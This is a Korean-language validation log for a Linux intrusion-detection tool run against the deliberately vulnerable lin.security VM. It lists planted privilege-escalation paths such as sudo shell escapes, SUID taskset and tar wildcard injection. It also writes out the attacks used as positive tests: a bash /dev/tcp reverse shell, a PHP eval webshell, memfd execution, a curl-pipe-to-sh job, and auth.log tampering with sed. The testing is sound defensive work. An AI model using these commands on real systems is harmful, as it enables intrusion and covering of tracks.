# 2026-11-02 lin.security 첫 적용

- VM: lin.security (Ubuntu 18.04), 스냅샷 `original`에서 시작
- Python: 3.6.5
- 도구 버전: 커밋 004b7d8 (Python 3.6 호환), 구현 항목 ACC-01 하나
- 실행 계정: bob, root 실행은 `sudo /bin/bash -c '...'` (bob에게 허용된 권한 안에서)
- 정식 측정 여부: 아니오 (사전 확인). 정식 측정은 `original` 스냅샷으로 되돌린 뒤 다시 한다.

## 결과

| 확인 | 결과 |
| --- | --- |
| 단위 테스트 (2개) | 통과 — Python 3.6 호환 확인 |
| `--list` | 구현 1 / 전체 52 |
| 전체 판정 | 심각 |

| 항목 | 기대 | 결과 | 근거 |
| --- | --- | --- | --- |
| ACC-01 | 탐지 | 탐지 | `/etc/passwd` 33행 `insecurity` 계정, UID 0 |

## 발견한 문제와 조치

| 발견 | 조치 |
| --- | --- |
| 근거 줄에 `insecurity`의 비밀번호 해시가 그대로 출력됨 | ACC-01 근거에서 비밀번호 칸 가림 |
| `insecurity`의 해시가 `/etc/shadow`가 아니라 `/etc/passwd`에 직접 저장됨 (DES 형식) | ACC-04 범위 확장 검토 중 |
| `sudo -l`에 NOPASSWD가 없어, 원래 정의("sudoers의 NOPASSWD 항목")로는 bob의 sudo 권한을 못 잡음 | ACC-06을 "sudo로 root 셸을 얻을 수 있는 권한 부여"로 재정의 |
| 읽지 못한 파일이 "이상 없음"으로 보고되는 구조 | '점검 불가' 상태 추가 |

## ACC-06 정답 목록 (`sudo -l`, bob)

`(ALL)`로 허용된 27개 (중복 1개 포함, 고유 26개). 비밀번호 필요.

- 셸 6개: ash, bash, csh, dash, sh, zsh
- 셸 탈출 19개: awk, ed, env, expect, find, ftp, git, less, man, more, perl, pico, rvim, scp, script, socat, ssh, tclsh, vi
- 파일 쓰기 1개: curl
- 중복: `/usr/bin/scp` 두 번

다음 적용에서 ACC-06이 bob 규칙 하나를 **심각**으로, 위 26개를 근거로 내야 한다.

추가 (2차 적용에서 발견): `peter ALL=(ALL) NOPASSWD: STRACE` — `strace` 셸 탈출, 비밀번호 없음 → **심각**

## ACC-07 정답 (`find / -name "authorized_keys*"`)

- `/root/.ssh/authorized_keys` — 0바이트(키 없음), 권한 600, `.ssh` 700, root 소유
- sshd 설정: `AuthorizedKeysFile`은 주석 처리된 기본값
- 기대: 탐지 없음

## PER-01 정답 (`/etc/crontab`, `/etc/cron.d`, 사용자 crontab, `cron.*` 폴더)

- `/etc/crontab` 15행 `*/1 * * * * root /etc/cron.daily/backup` — 원래 하루 한 번 도는 스크립트를 root로 **매분** 실행
- `/etc/cron.daily/backup` 2행 `for i in $(ls /home); do cd /home/$i && /bin/tar -zcf /etc/backups/home-$i.tgz *; done`
  - 사용자 홈에서 `tar ... *` → 파일 이름으로 tar 옵션 주입(`--checkpoint-action=exec=...`) → 모든 사용자가 root 획득 가능
  - 스크립트 자체는 `755 root`라 수정 불가 — 위험은 내용에 있음
- 그 외: `run-parts` 4줄, `cron.d/mdadm`, `cron.d/popularity-contest`, `cron.daily`의 Ubuntu 기본 스크립트 13개 — 정상
- 사용자 crontab 없음 (`/var/spool/cron/crontabs` 비어 있음)
- 기대: PER-01 **심각** 1건 (`backup` 2행, 실행 경로 2개: `/etc/crontab` 15행과 `cron.daily` run-parts)

## PER-05 정답 (`/etc/ld.so.preload`, `/etc/ld.so.conf`)

- `/etc/ld.so.preload` 없음
- `/etc/ld.so.conf`: `include /etc/ld.so.conf.d/*.conf`
- 라이브러리 경로 4개 (Ubuntu 기본): `/usr/local/lib`, `/usr/local/lib/x86_64-linux-gnu`, `/lib/x86_64-linux-gnu`, `/usr/lib/x86_64-linux-gnu`
- 기대: 탐지 없음, 확인 범위 "preload 없음, 라이브러리 경로 4개"
- 폴더 권한은 정답 자료에 없음 — 도구가 직접 확인하는 첫 정보

## PRC-01 정답 (`ls -l /proc/[0-9]*/exe | grep deleted`, 2026-11-03)

- 실행 파일이 지워진 채 도는 프로세스 없음
- 기대: 탐지 없음, 점검 범위에 확인한 프로세스 수

## PRC-03 정답 (2026-11-03)

- `ls -l /proc/[0-9]*/exe | grep -E "/(tmp|var/tmp|dev/shm)/"` → 없음 (실행 파일이 임시 폴더에 있는 프로세스 없음)
- `ps -eo pid,args | grep -E "/(tmp|var/tmp|dev/shm)/"` → 없음 (명령줄에 임시 폴더 경로가 있는 프로세스 없음)
- 기대: 탐지 없음

## FS-02 정답 (2026-11-03, `find` + `dpkg -S`)

SUID·SGID 파일 39개, 모두 패키지 소속. 그중 둘은 패키지가 SUID로 설치하지 않는 프로그램:

| 파일 | 권한 | 패키지 | 판단 |
| --- | --- | --- | --- |
| `/usr/bin/taskset` | `-rwsr-sr-x` root | util-linux | `taskset 1 /bin/sh -p`로 누구나 root 셸 — **심각** |
| `/usr/bin/xxd` | `-rwsr-x---` root | xxd | root 권한 파일 읽기·쓰기(`/etc/shadow` 읽기, `/etc/passwd` 수정). 다른 사용자 실행 권한 없음 → 소유 그룹 구성원만 — **심각** |

나머지 37개는 Ubuntu 18.04 기본 SUID·SGID (`passwd`, `su`, `sudo`, `mount`, `pkexec`, `at`, `ssh-keysign` 등).
기대: FS-02 심각 2건, 점검 범위 "SUID·SGID 39개 (패키지 소속 39개)".
(`pkexec`는 2018년 버전이라 PwnKit 취약점 가능성이 있으나, 취약 버전 탐지는 이 프로젝트의 비목표.)

## FS-06 정답 (2026-11-03)

- `/var/www` 없음, nginx·Apache·PHP 미설치 (웹 서버 없음)
- 기대: 탐지 없음, 점검 범위 "웹 루트 0개, 스크립트·이미지 파일 0개"
- 이 VM에서는 판정 경로만 확인할 수 있어, 웹쉘을 심는 양성 확인과 실제 웹 애플리케이션 오탐 측정은 깨끗한 Ubuntu 24.04(nginx·php-fpm·WordPress)에서 한 번 더 한다.

## LOG-01 정답 (2026-11-03, `original` 복원 후)

- rsyslog 설정은 24.04와 같은 7개 대상 (`auth.log`, `syslog`, `kern.log`, `mail.log`, `mail.err`, `ufw.log`, `cloud-init.log`)
- 실제 있는 파일: `auth.log` 2,229B, `syslog` 153,289B, `kern.log` 49,955B. `mail.*` 없음
- 순환 파일(`.1`, `.2.gz`) 없음. 세 파일 모두 오늘 부팅 시각(`Nov  3 03:02:25`)부터 시작 — 배포 전 제작자가 `/var/log`를 비운 것으로 보임
- 웹 로그 없음 (nginx·Apache 미설치)
- 로그를 연 프로세스: rsyslogd(672) — syslog·kern.log·auth.log만
- 지워진 채 열린 로그: 없음, NUL 없음 (18.04 형식 `Nov  3 03:02:25 linsecurity …`)
- 기대: LOG-01 탐지 없음

관찰: 오래된 시스템인데 로그 이력이 부팅 시점부터만 있는 상태는 LOG-01 규칙(비움·잘림·바꿔치기·사슬 끊김)으로는 잡히지 않는다. 흔적이 남지 않는 "통째로 지우고 다시 부팅"은 wtmp·lastlog와의 불일치(LOG-02)나 journal 공백(LOG-05)으로 보는 2단계 과제로 남긴다.

## 2-A 계정·인증 정답 (2026-11-05)

- ACC-02: `insecurity`가 `/etc/passwd`에만 있고 `/etc/shadow`에 없음 (손으로 넣은 계정). 기본 그룹은 모두 있음. 생성 기록(`new user`) 없음 — 로그를 비운 VM
- ACC-03: UID 1~999 중 로그인 셸은 `sync`(/bin/sync)뿐 → 제외 대상
- ACC-04: `insecurity`의 passwd 비밀번호 칸에 해시가 직접 들어 있음 (`AzER…`, DES 형식). shadow에는 빈 비밀번호·MD5·DES 없음
- ACC-05: `root`·`disk`·`sudo`·`shadow`·`lxd` 그룹은 구성원 없음, `adm`에 `syslog`. **`docker` 그룹에 `peter`** — docker 그룹은 `docker run -v /:/mnt`로 root 파일시스템을 다룰 수 있어 사실상 root 권한. peter는 sudo 그룹이 아니므로 그룹으로 얻는 새 권한 상승 경로 (sudoers의 strace NOPASSWD와 별개)
- ACC-08/09: SSH 성공 2건 (192.168.56.1, 검증자 호스트), 실패 없음
- ACC-10: `PermitRootLogin yes`
- ACC-11: 패키지 밖 PAM 모듈 없음, PAM 패키지 검증(`dpkg --verify`) 변경 없음. `pam_permit.so`는 Ubuntu 기본 위치에만 (`common-auth`의 `auth required`, `common-session`·`common-account`·`common-password`)

기대: ACC-02 위험(insecurity), ACC-04 위험(insecurity), ACC-05 위험(peter docker), ACC-10 참고(PermitRootLogin yes), 나머지 탐지 없음.

## 2-B 프로세스·네트워크 정답 (2026-11-06)

- 리스닝: sshd 22, systemd-resolved 53(lo), systemd-networkd 68(DHCP), rpcbind 111·632, rpc.mountd 여러 포트, **소유 프로세스가 없는 소켓** 2049·40155·44349(tcp), 2049·34056·43427(udp) — NFS 서버의 커널 스레드(nfsd·lockd)가 연 소켓이라 프로세스가 없음
- 연결: sshd ↔ 192.168.56.1 (검증자)
- raw·packet: systemd-networkd만 (LLDP packet 소켓, ipv6-icmp raw 소켓)
- memfd 실행, 대괄호 이름 위장, PID 2의 자식 중 실행 파일 있는 것, LD_PRELOAD: 없음
- 표준 입출력이 소켓: systemd 서비스 다수(journald unix 소켓) — 셸·TCP는 없음
- ps 110개 = /proc 110개, pid_max 32768
- promiscuous 인터페이스 없음 (docker0는 DOWN)

기대: 2-B 10개 항목 탐지 없음. NFS 커널 소켓은 프로세스가 없어도 정상으로 처리해야 함.


## 19차 적용 — 2-B (`db87e47`, 2026-11-06)

기준선(`original`): 1·2단계 탐지 10건은 그대로(권한 상승 경로 7 / 7). 2-B에서 **NET-01 오탐 8건**:
- tcp 2049·35797, tcp6 2049·44687, udp 2049·41351, udp6 2049·58994 — "inode가 있는데 어느 프로세스의 것도 아니다"
- 원인: 2-B 설계 때 NFS 커널 소켓의 inode가 0이라고 보고 inode 0만 커널 소켓으로 뺐는데, 실제로는 nfsd·lockd가 연 소켓도 inode가 있다(파일 설명자만 없음). 정답 자료에는 포트만 있었고 inode는 확인하지 않았다
- lockd 포트는 부팅마다 바뀐다 (정답 수집 때 40155·44349·34056·43427 → 이번 35797·44687·41351·58994) — 포트 번호로 뺄 수 없음
- 나머지 2-B 항목은 탐지 없음. PRC-05 /proc 109개·ps 110개, PRC-06 2개(네트워크 관리 데몬 1개 제외)

양성 (root 셸):

| 시험 | 결과 |
| --- | --- |
| `nc -lnv 4444` | NET-01 위험 일치 |
| 리버스 셸 | 재현 안 됨 — 24.04 주소(192.168.16.69)로 접속해 "Network is unreachable" |
| memfd | 재현 안 됨 — Python 3.6에 `os.memfd_create` 없음 (3.8부터) |
| `exec -a "[kworker/0:9]" sleep` | PRC-04 심각 일치 |
| `LD_PRELOAD=/tmp/.l/libh.so sleep` | PRC-07 위험 일치 |
| `tcpdump -i enp0s3` | PRC-06·NET-06 위험 일치 (root 그대로 실행) |


## 20차 적용 — 2-B 보정 (`84da293`, 2026-11-06)

기준선(`original`): 탐지 10건 — 1·2단계 탐지와 같음 (권한 상승 경로 7 / 7). **NET-01 오탐 0건**:
- 점검 범위 "리스닝 소켓 31개 — … tcp/2049(커널 nfsd), tcp/34639(커널 lockd), tcp/38263(커널 lockd) … 커널 NFS 소켓 8개"
- 2-B 10개 항목 탐지 없음. PRC-05 /proc 105개·ps 106개

양성 (root 셸, 한 줄씩):

| 시험 | 기대 | 결과 |
| --- | --- | --- |
| `nc -lnv 4444` + `bash -i >& /dev/tcp/192.168.56.106/4444 0>&1` | PRC-08 심각, NET-01 위험, NET-02 위험 2건 | 일치 — PRC-08 bash fd 0·1·2 → 192.168.56.106:4444, NET-01 nc.openbsd, NET-02 bash "나가는 연결(상대 192.168.56.106:4444)"·nc "들어온 연결(4444번 포트 ← 192.168.56.106:55626)" |
| ctypes `syscall(319)`(memfd_create) + `execv('/proc/self/fd/3')` | PRC-02 심각 | 일치 — "PID 17609 '3'(명령줄 sleep 3600)", memfd:payload, comm 근거 "파일 설명자 경로로 실행한 흔적 (fexecve)" |

19차의 PRC-04·06·07, NET-06 결과와 합쳐 lin.security에서 재현 가능한 2-B 양성 모두 일치. 이후 `original` 복원.

## 2차 적용 (같은 날, 커밋 58982a3)

구현 항목 ACC-01, ACC-06. 첫 실행은 새 버전을 복사하기 전이라 측정에서 제외했다.

| 확인 | 결과 |
| --- | --- |
| 단위 테스트 (28개, bob 계정) | 통과 — 권한 테스트도 건너뛰지 않고 실행됨 |
| 전체 판정 | 심각 (탐지 3건, 점검 불가 0) |

| 항목 | 기대 | 결과 | 근거 |
| --- | --- | --- | --- |
| ACC-01 | 탐지, 해시 가림 | 일치 | `insecurity:<가림>:0:0::/:/bin/sh` |
| ACC-06 bob | 심각, 셸 6 / 셸 탈출 19 / 파일 쓰기 1 | **정확히 일치** | `/etc/sudoers` 24행 `bob ALL=(ALL) ALLTHETHINGS` |
| ACC-06 peter | (정답 목록에 없음) | 심각, `strace` NOPASSWD | `/etc/sudoers` 23행 `peter ALL=(ALL) NOPASSWD: STRACE` |

- 실제 sudoers는 bob 권한을 `Cmnd_Alias ALLTHETHINGS` 하나로 적어 두었다. 테스트 fixture(직접 나열)와 형태가 달랐지만 별칭을 풀어 정답과 같은 26개를 찾았다.
- peter 규칙은 bob의 `sudo -l`로 만든 정답 목록 밖이었다. 도구가 sudoers 전체를 읽어 찾았다. 정답 목록에 추가한다.
- **1단계 완료 조건(권한 상승 경로 3개 이상) 충족**: UID 0 계정(insecurity), bob의 sudo, peter의 sudo strace.

발견한 문제와 조치

| 발견 | 조치 |
| --- | --- |
| 근거에 별칭 이름(`ALLTHETHINGS`, `STRACE`)만 보여 정의를 찾으러 sudoers를 다시 열어야 함 | 사용한 별칭의 정의 줄을 근거에 추가 |

## 3차 적용 (커밋 d9f91ae)

구현 항목 ACC-01, ACC-06, ACC-07. 첨부 앞부분의 실행은 이전 버전이라 제외했다.

| 확인 | 결과 |
| --- | --- |
| 단위 테스트 (54개, bob 계정) | 통과, 일반 계정에서만 건너뛰는 4개 제외 |
| ACC-06 별칭 근거 | 일치 — `STRACE`(18행), `ALLTHETHINGS`(19행) 정의 줄 표시 |
| ACC-07 | 이상 없음 — 정답과 일치 (빈 키 파일, 오탐 없음) |

## 4차 적용 — ACC-07 양성 확인 (키를 심어 재현)

Atomic Red Team T1098.004와 같은 행위를 손으로 재현했다. 끝난 뒤 `original` 스냅샷으로 복원.

1. `ssh-keygen -t ed25519 -f /tmp/lt-test -N "" -C "lintrace-test"` → 지문 `SHA256:Y/akg+DeFOV/papfgqGjkQNY2qQ87NqV6rySrhsezs0`
2. 같은 공개키를 `/.ssh/authorized_keys`(insecurity, UID 0)와 `/var/www/.ssh/authorized_keys`(www-data)에 넣음

| 기대 | 결과 |
| --- | --- |
| 심각: insecurity(UID 0)의 키 | 일치 |
| 심각: www-data(시스템 계정)의 키 | 일치 |
| 참고: 같은 키가 두 계정에 등록됨 | 일치 |
| 근거의 지문이 `ssh-keygen` 출력과 같음 | **완전히 일치** — auth.log의 `Accepted publickey ... SHA256:...`와 바로 대조 가능 |

시각이 `+0000`으로 표시된 것은 lin.security의 시스템 시간대가 UTC이기 때문 (점검 대상의 시간대로 표시하는 것이 의도된 동작).

## 5차 적용 (커밋 a11730b)

구현 항목 ACC-01, ACC-06, ACC-07, PER-01.

| 확인 | 기대 | 결과 |
| --- | --- | --- |
| 단위 테스트 (bob 계정) | 70개 중 9개 건너뜀 | 일치 |
| PER-01 | `backup` 2행 심각 1건 | 일치 |
| PER-01 실행하는 곳 | `/etc/crontab` 12행(cron.daily), 15행(매분) | 일치 |
| PER-01 오탐 | 0건 | 일치 — `cron.daily` 13개, `cron.weekly` 2개, `cron.d` 2개 모두 통과 |
| ACC-07 | 키 파일 1개, 키 0개 | 일치 |

**lin.security에 의도적으로 심어진 권한 상승 경로 4개를 모두 탐지했다.**

| 경로 | 항목 | 판정 |
| --- | --- | --- |
| UID 0 계정 `insecurity` | ACC-01 | 심각 |
| bob의 sudo (셸 6, 셸 탈출 19, 파일 쓰기 1) | ACC-06 | 심각 |
| peter의 sudo strace (NOPASSWD) | ACC-06 | 심각 |
| cron `backup`의 tar 와일드카드 주입 (root, 매분) | PER-01 | 심각 |

1단계 진행: 4 / 10 (ACC-01, ACC-06, ACC-07, PER-01). 남은 항목: PER-05, PRC-01, PRC-03, FS-02, FS-06, LOG-01.

발견한 문제와 조치

| 발견 | 조치 |
| --- | --- |
| PER-01 '다음 확인' 문장에 두 해결책(`--`, `./*`)이 섞여 읽기 어려움 | 문장 수정 |
| 확인 범위가 '이상 없음' 항목에만 보여, 탐지 항목이 몇 개를 보고 찾았는지 알 수 없음 | 리포트 끝 '점검 범위' 구역에 모든 항목의 범위와 결과를 모음 |

## 6차 적용 (커밋 89504cd)

구현 항목 ACC-01, ACC-06, ACC-07, PER-01, PER-05.

| 확인 | 기대 | 결과 |
| --- | --- | --- |
| PER-05 | 이상 없음, preload 없음, 라이브러리 경로 4개 | 일치 |
| 라이브러리 폴더 4개의 권한 (정답 자료에 없던 정보) | — | 모두 이상 없음 |
| 점검 범위 구역 | 5개 항목 모두 한 줄씩 | 일치 |

점검 범위 숫자 — 몇 개를 보고 몇 개를 찾았는지 (오탐 수준의 근거)

| 항목 | 확인한 것 | 탐지 |
| --- | --- | --- |
| ACC-01 | 계정 34개 | 1 |
| ACC-06 | sudoers 파일 2개, 사용자 규칙 5개 | 2 |
| ACC-07 | 키 파일 1개, 키 0개 | 0 |
| PER-01 | 예약 작업 7개, root가 실행하는 스크립트 16개 | 1 |
| PER-05 | 라이브러리 경로 4개 | 0 |

## 7차 적용 — PER-05 양성 확인 (preload에 적어 재현)

`/etc/ld.so.preload`에 실제 시스템 라이브러리 `/lib/x86_64-linux-gnu/libdl.so.2`와 없는 파일 `/tmp/.x/libhide.so`를 적음. 확인 후 삭제, `original` 스냅샷으로 복원.

| 기대 | 결과 |
| --- | --- |
| 심각 1건, "임시 폴더: /tmp/.x/libhide.so" | 일치 |
| 1행 libdl (있음, 644, UID 0), 2행 libhide (파일 없음) | 일치 |
| 파일 변경 "0초 전" | 일치 |
| 점검 범위 "preload 라이브러리 2개 (탐지 1건)" | 일치 |

발견한 문제와 조치

| 발견 | 조치 |
| --- | --- |
| 도구 출력 맨 위에 동적 링커의 `ERROR: ld.so: object '/tmp/.x/libhide.so' ... ignored` — **진단 도구 자신도 preload가 적용된 상태로 실행됨**. 진짜 루트킷이면 도구 결과까지 숨길 수 있는데 리포트는 다른 항목의 '이상 없음'을 그대로 믿게 둠 | preload가 있으면 판정 줄 아래에 "결과 신뢰" 경고. `/proc/self/maps`로 실제로 불려 들어갔는지 구분해 문구를 달리함 |
| `libdl.so.2`는 실제로는 `libdl-2.27.so`를 가리키는 링크인데 근거에 드러나지 않음 (정상 이름의 링크로 위장하는 경우 대비) | 근거에 링크 대상 표시 |

## 8차 확인 (2026-11-03, 스냅샷 복원 후 커밋 89504cd 재복사)

| 확인 | 기대 | 결과 |
| --- | --- | --- |
| 단위 테스트 (bob 계정) | 82개 중 17개 건너뜀 | 일치 |
| PRC-01 정답 자료 | — | 해당 프로세스 없음 |

## 9차 적용 — PRC-01 양성 확인 (커밋 89e40a9)

root 셸에서 `/bin/sleep`을 `/tmp/.lt-x`로 복사해 실행한 뒤 파일 삭제. 확인 후 프로세스 종료, `original` 스냅샷으로 복원.

| 기대 | 결과 |
| --- | --- |
| 심각 1건, "원래 위치 /tmp/.lt-x가 임시 폴더에 있다" | 일치 |
| 근거의 SHA-256 = `sha256sum /bin/sleep` | **완전히 일치** (`c5f12f157b605b1141e6f97796732247a26150a0a019328d69095e9760b42e38`) |
| 부모 프로세스 | `PID 19465(bash)` — 백그라운드 작업 번호 `[1] 19465`와 같음 |
| 다른 프로세스 오탐 | 0건 (프로세스 110개 중 심은 것만 탐지) |
| root로도 접근 거부되는 프로세스 | 없음 |

## 10차 확인 — 새 버전 테스트 (커밋 89e40a9)

| 확인 | 기대 | 결과 |
| --- | --- | --- |
| VM의 커밋 (`git log`) | `89e40a9` | 일치 |
| `--list` | 구현 6 / 52 | 일치 |
| 단위 테스트 (bob 계정) | 96개 중 22개 건너뜀 | 일치 |

1단계 진행: 6 / 10 (ACC-01, ACC-06, ACC-07, PER-01, PER-05, PRC-01). 남은 항목: PRC-03, FS-02, FS-06, LOG-01.

## 11차 적용 — PRC-03 양성 확인 (커밋 46805ae)

새 버전 확인: 커밋 `46805ae`, 구현 7/52, 단위 테스트 104개 중 22개 건너뜀(bob) — 일치.

root 셸에서 `/bin/sleep`을 `/tmp/.lt3/bin`·`/tmp/.lt3/gone`으로 복사해 실행, `python3 /tmp/.lt3/s.py` 실행, `gone`은 실행 후 삭제. 확인 후 종료·삭제, `original` 스냅샷으로 복원.

| 기대 | 결과 |
| --- | --- |
| PRC-01 심각 1건 (`gone`) | 일치 |
| PRC-03 심각 2건 (`bin`, `gone`) | 일치 |
| `gone`에 "PRC-01에서도 탐지" 표시 | 일치 |
| PRC-03 위험 1건 (`s.py`, 스크립트 SHA-256 포함) | 일치 |
| 실행 파일 해시 = `/bin/sleep` (`c5f12f…`) | 일치 (`bin`, `gone` 모두) |
| 다른 프로세스 오탐 | 0건 (프로세스 107개 중 심은 3개만) |

세 프로세스의 부모가 모두 `PID 10891(bash)`로 같게 나와, 공통 수집기가 같은 시점의 표를 두 항목에 나눠준 것이 확인됨.

1단계 진행: 7 / 10 (ACC-01, ACC-06, ACC-07, PER-01, PER-05, PRC-01, PRC-03). 남은 항목: FS-02, FS-06, LOG-01.

## 12차 적용 — FS-02 (커밋 06b4175)

| 기대 | 결과 |
| --- | --- |
| FS-02 심각: `taskset` (누구나 실행) | 일치 |
| FS-02 심각: `xxd` (소유 그룹 `itservices` 구성원만 실행) | 일치 |
| 점검 범위 "SUID·SGID 39개 (패키지 소속 39개)" | 일치 (파일 94,722개 중) |
| 나머지 37개 오탐 | 0건 |
| PRC-01·PRC-03 (아무것도 심지 않은 상태의 첫 기준선) | 탐지 없음, 프로세스 104개 |

시각 관찰 (판정에는 쓰지 않음, 3단계 상관분석 자료):
- `taskset` 속성 변경(ctime) 2018-07-09 19:54:11
- `backup` 내용 변경(mtime) 2018-07-09 19:54:45 — taskset SUID 설정 34초 뒤
- `xxd` 속성 변경(ctime) 2018-07-10 08:02:47

제작자가 권한 상승 경로를 심은 순서가 ctime으로 드러나, 실제 침해에서도 SUID 설정과 예약 작업 변경이 짧은 간격으로 이어지는지를 묶어 보는 근거가 된다.

lin.security에 심긴 권한 상승 경로 6개 모두 탐지:

| 경로 | 항목 |
| --- | --- |
| `insecurity` UID 0 | ACC-01 |
| bob sudo `ALLTHETHINGS` 별칭 | ACC-06 |
| peter sudo `strace` NOPASSWD | ACC-06 |
| cron `backup`의 tar 와일드카드 | PER-01 |
| `taskset` SUID | FS-02 |
| `xxd` SUID (그룹 `itservices`) | FS-02 |

1단계 진행: 8 / 10 VM 확인 (ACC-01, ACC-06, ACC-07, PER-01, PER-05, PRC-01, PRC-03, FS-02). FS-06 구현 완료(이 VM 적용 대기), 남은 항목: LOG-01.

## 13차 적용 — 새 버전 (커밋 1f0c0fc)

| 기대 | 결과 |
| --- | --- |
| 기존 6건 (ACC-01 1, ACC-06 2, PER-01 1, FS-02 2) 그대로 | 일치 |
| FS-06 탐지 없음, "웹 루트 0개, 스크립트·이미지 파일 0개" | 일치 |
| PRC-01·PRC-03 오탐 | 0건 (프로세스 104개) |

FS-02가 훑은 파일 수는 94,683개 (12차 94,722개 — 도구 폴더 복사본 차이 등 VM 상태에 따라 조금씩 다름).

## 14차 적용 — FS-06 양성 확인 (웹쉘 5개 심기)

`/var/www/html`에 `shell.php`, `logo.jpg`, `obf.php`, `uploads/a.php`, `index.php`를 만든 뒤 실행.

| 기대 | 결과 |
| --- | --- |
| `shell.php` 심각 (요청 값 → 실행 함수) | 일치, 근거 1행 `<?php @eval($_POST["x"]); ?>` |
| `logo.jpg` 심각 (이미지 속 PHP) | 일치 |
| `obf.php` 심각 (인코딩을 풀어 실행) | 일치 |
| `uploads/a.php` 위험 (업로드 폴더 안 스크립트) | 일치 |
| `index.php` 탐지 없음 | 일치 |
| 점검 범위 "웹 루트 1개 (/var/www), 스크립트·이미지 파일 5개" | 일치 |
| 다른 항목 결과 변화 없음 | 일치 (탐지 6 → 10건, 늘어난 4건 모두 FS-06) |

교차 확인: 같은 실행에서 FS-02가 훑은 파일 수가 94,683 → 94,688개로 심은 파일 5개만큼 늘어, 두 항목이 같은 파일 시스템 상태를 보고 있음을 확인. 이후 스냅샷 복원.

1단계 진행: 9 / 10 VM 확인 (FS-06 추가). 남은 항목: LOG-01. FS-06의 실제 웹 애플리케이션 오탐 측정은 Ubuntu 24.04 + WordPress에서 진행.

## 15차 적용 — LOG-01 (커밋 4ace10c, 코드 해시 6315b457…)

복사: Windows 백신이 `tests/test_fs_06.py` 읽기를 막아 묶음이 깨졌음 → 그 파일을 빼고 묶은 뒤 VM에서 `git checkout -- .`로 복구 (validation/README.md 절차).

- 단위 테스트 151개 통과 (bob 27개, root 6개 건너뜀), 실행한 점검 10개
- 기존 6건 그대로, LOG-01 탐지 없음: "rsyslog 대상 7개, 웹 로그 0개, 그중 있는 파일 4개 (나머지 3개는 아직 만들어지지 않음), 로그를 연 프로세스 1개" (정답 수집 때 3개 → 그사이 설정 파일 하나가 새로 생김)

## 16차 적용 — LOG-01 양성 확인 (`sudo /bin/bash` 셸)

| 조작 | 기대 | 결과 |
| --- | --- | --- |
| `sed -i '/COMMAND/d' /var/log/auth.log` | 심각 (바꿔치기) | 일치 — rsyslogd(PID 713) fd 9가 지워진 원래 파일을 붙잡음, 원래 inode 135317·18,322B → 지금 inode 131104·17,996B (326B, sudo 기록 줄 삭제분) |
| `systemctl restart rsyslog` 뒤 `: > /var/log/syslog` + `logger` | 탐지 없음 | 일치 — 비운 뒤 새 줄이 들어가 빈 파일 아님. 앞부분 NUL도 없음 (rsyslog는 이어 쓰기) |
| `touch kern.log.2.gz` + `rm kern.log` | 심각(지워진 채 열림) + 위험(사슬) | 위험 1건만: "현재 로그 파일은 없는데 순환 파일 1개가 있다" |

`kern.log` 삭제가 심각으로 나오지 않은 이유: 바로 앞에서 rsyslog를 재시작했고, rsyslog는 파일을 첫 메시지가 올 때 연다. 재시작 뒤 커널 메시지가 없어 kern.log를 열지 않은 상태에서 지웠으므로 붙잡힌 파일이 없다 (도구 결함이 아니라 시험 순서의 영향). 이 경우는 순환 파일이 남아 있어 사슬 규칙이 위험으로 잡았다.
한계로 기록: 기록 프로세스가 아직 열지 않은 로그를, 순환 파일도 없을 때 지우면 "아직 만들어지지 않은 파일"과 구분할 수 없다.

1단계 진행: 10 / 10 VM 확인.

## 17차 적용 — 2-0 JSON·증거 아카이브 (커밋 2028e04, 버전 0.1.0, 코드 해시 1df9a40f…)

`original` 복원 후 복사. 단위 테스트 158개 통과 (bob 27개 건너뜀). `01182af`(LOG-01 빈 auth.log 판정 변경)도 이 버전에 포함.

| 확인 | 결과 |
| --- | --- |
| 기준선 `--json --out` | 기존 6건 그대로, LOG-01 이상 없음. JSON `verdict: critical`, counts `findings 6 / critical 6 / unavailable 0` — 텍스트와 일치 |
| JSON `tool.code_sha256` | `1df9a40f…` — 셸로 계산한 코드 해시와 같음 |
| 아카이브 | 근거 경로 6개 중 6개 복사: `etc/passwd`, `etc/sudoers`, `etc/crontab`, `etc/cron.daily/backup`, `usr/bin/taskset`, `usr/bin/xxd`. `sha256sum -c SHA256SUMS` 9개 모두 OK |

양성 확인: `sed -i '/COMMAND/d' /var/log/auth.log` 후 `--out`

| 확인 | 결과 |
| --- | --- |
| LOG-01 | 심각 (rsyslogd PID 692 fd 9) |
| 아카이브 | 근거 경로 9개 중 8개 복사 (`/proc/692` 폴더는 복사 대상 아님) |
| 지운 줄 복구 | 현재 `/var/log/auth.log`의 `COMMAND=` 0줄 → 아카이브 `evidence/proc/692/fd/9`에 1줄 — 지운 sudo 기록을 재시작 전에 원본째 보존 |

이후 `original` 복원.

## 18차 적용 — 2-A 계정·인증 (커밋 16b04fa, 코드 해시 5317789b…)

단위 테스트 183개 통과 (bob 27개 건너뜀). 실행한 점검 18개, 탐지 10건 — 정답 기대와 모두 일치.

| 항목 | 결과 |
| --- | --- |
| 기존 6건 (ACC-01, ACC-06 ×2, PER-01, FS-02 ×2) | 그대로 |
| ACC-02 | 위험: `insecurity` — shadow에 항목 없음 |
| ACC-04 | 위험: `insecurity` — passwd에 해시 직접(DES 13자, 내용은 보이지 않음) |
| ACC-05 | 위험: `peter` docker 그룹 — 근거에 "ACC-06에서도 탐지" 교차 표시 |
| ACC-10 | 참고: `PermitRootLogin yes` |
| ACC-03·08·09·11 | 탐지 없음 (SSH 성공 2건·실패 0건, PAM 설정 25개·모듈 21개 모두 패키지 소속·해시 일치) |

lin.security 권한 상승 경로: 1단계 6개 + 2-A에서 찾은 peter docker 그룹 = **7 / 7 탐지**.


## 21차 적용 — 2-C 지속성·패키지 무결성 (`87073a1`, 코드 해시 86784267…, 2026-11-06)

기준선(`original`): 탐지 14건 — 1·2단계 10건 + 2-C 4건, 정답과 일치
- PER-02 심각: /lib/systemd/system/debug.service — 패키지 밖, 소유자 peter, 실행 대상 /root/debug, 활성화 링크 → **권한 상승 경로 8 / 8**
- PER-04 위험: /etc/profile 28행 `unset HISTFILE` (base-files 원본과 비교해 바뀐 줄 1개)
- PER-09 위험: 00-header 원본과 다름. logo는 실행 권한 없음(범위), 지워진 패키지 스크립트 10개(dpkg --verify의 12개 중 2개는 obsolete 설정 파일로 보임)
- FS-04 참고: crontab·sudoers·sysctl.d/10-ipv6-privacy.conf (설정 파일 565개 중 다름 4개·삭제 11개)
- 정상: snap mount 2개(실행 지시어 없음), 대체 링크 48개, diversion 1개, 모듈 88개, init.d 42개

양성: `echo 'curl -s http://127.0.0.1/a | sh' | at now + 1 hour` → PER-06 심각 "내려받아 바로 실행한다", 작업 파일 25행 — 일치. 이후 `original` 복원


